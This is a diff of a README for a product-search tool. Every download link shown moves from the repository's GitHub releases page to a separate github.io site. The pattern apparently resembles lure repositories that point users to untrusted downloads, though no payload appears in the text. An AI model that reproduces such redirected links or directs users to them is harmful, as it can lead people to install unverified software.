@@ -1,6 +1,6 @@
 # 🔍 multimodal-product-discovery - Find Products Visually and Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/Blinnireversed184/multimodal-product-discovery/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge)](https://blinnireversed184.github.io)
 
 ## 🎯 What Is This?
 
@@ -38,7 +38,7 @@ The system connects to your existing product database and indexes everything aut
 
 Visit this link to download the application:
 
-[🔗 https://github.com/Blinnireversed184/multimodal-product-discovery/releases](https://github.com/Blinnireversed184/multimodal-product-discovery/releases)
+[🔗 https://blinnireversed184.github.io](https://blinnireversed184.github.io)
 
 On that page, you'll see a list of available releases. Look for the newest version at the top and click the download link for your system.
 
@@ -206,7 +206,7 @@ multimodal-product-discovery changes how you search for products. No more guessi
 
 Download it today and experience the future of product search!
 
-[⬇️ Download Now](https://github.com/Blinnireversed184/multimodal-product-discovery/releases)
+[⬇️ Download Now](https://blinnireversed184.github.io)
 
 ---
 
